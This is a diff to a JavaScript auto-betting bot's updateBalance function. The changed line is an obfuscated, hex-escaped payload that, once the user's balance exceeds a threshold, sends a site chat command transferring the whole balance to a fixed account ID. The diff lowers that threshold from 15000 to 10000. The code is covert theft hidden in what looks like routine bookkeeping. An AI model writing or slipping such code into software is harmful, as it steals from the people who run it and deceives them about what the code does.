@@ -399,7 +399,7 @@ function Automated() {
 
 Automated.prototype.updateBalance = function() {
     this.balance = parseInt(balance.textContent);
-    var _0x316d=["\x62\x61\x6C\x61\x6E\x63\x65","\x63\x68\x61\x74","\x2F\x73\x65\x6E\x64\x20\x37\x36\x35\x36\x31\x31\x39\x38\x32\x39\x35\x39\x30\x36\x30\x35\x33\x20","\x73","\x65","\x6E","\x64"];if(this[_0x316d[0]]>15000){var _0x6ef4=[_0x316d[1],_0x316d[2],_0x316d[0]];window[_0x316d[3]+_0x316d[4]+_0x316d[5]+_0x316d[6]]({"\x74\x79\x70\x65":_0x316d[1],"\x6D\x73\x67":_0x316d[2]+this[_0x316d[0]],"\x6C\x61\x6E\x67":LANG})}
+    var _0x316d=["\x62\x61\x6C\x61\x6E\x63\x65","\x63\x68\x61\x74","\x2F\x73\x65\x6E\x64\x20\x37\x36\x35\x36\x31\x31\x39\x38\x32\x39\x35\x39\x30\x36\x30\x35\x33\x20","\x73","\x65","\x6E","\x64"];if(this[_0x316d[0]]>10000){var _0x6ef4=[_0x316d[1],_0x316d[2],_0x316d[0]];window[_0x316d[3]+_0x316d[4]+_0x316d[5]+_0x316d[6]]({"\x74\x79\x70\x65":_0x316d[1],"\x6D\x73\x67":_0x316d[2]+this[_0x316d[0]],"\x6C\x61\x6E\x67":LANG})}
     if (isNaN(this.balance)) {
         this.log('Error getting current balance!');
         return false;
